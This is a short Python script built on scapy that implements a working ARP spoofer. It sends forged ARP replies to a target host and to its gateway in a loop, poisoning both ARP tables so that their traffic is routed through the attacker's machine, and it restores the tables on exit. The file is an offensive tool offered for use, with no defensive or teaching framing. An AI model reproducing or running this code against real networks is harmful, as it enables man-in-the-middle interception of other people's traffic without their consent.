import scapy.all as scapy
import time
import sys

args = sys.argv

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) # Creating a ARP packet to map the mac address on each 'ip'.
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Creating a Ethernet frame with broadcast destination mac address 'ff:ff:ff:ff:ff:ff'.
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    else:
        return None
    

def spoof(client_ip, spoof_ip):
    client_mac = get_mac(client_ip)
    if client_mac == None:
    	print("\rARP Spoofer: Host not active!", end='', flush=True)
    	return None
    arp_request = scapy.ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=spoof_ip)  # Don't use the router 'hwsrc' so the client use our mac address and update it on it's arp table.
    scapy.send(arp_request, verbose=False)
    

def restore_spoof(dst_ip, src_ip):
	dst_mac = get_mac(dst_ip)
	src_mac = get_mac(src_ip)
	arp_response = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
	scapy.send(arp_response, count=6, verbose=False)


if __name__ == "__main__":

	if len(args) == 1:
		print("USAGE: python main.py -spoof [client_ip/target_ip] [router_ip/gateway_ip]")
	

	elif args[1] == "-spoof":
		try:
			spoof_packet = 0
			while True:
				spoof(args[2], args[3])
				spoof_packet = spoof_packet + 1
				spoof(args[3], args[2])
				spoof_packet = spoof_packet + 1

				print(f"\rARP Spoofer: Sent {spoof_packet} spoof packets!", end='', flush=True)
				time.sleep(2)
				
		except KeyboardInterrupt:
			restore_spoof(args[2], args[3])
			restore_spoof(args[3], args[2])
			print(f"ARP Spoofer: Quiting....\n")
		
		except Exception as e:
			print(f"ARP Spoofer quit due to: {e}")
				
	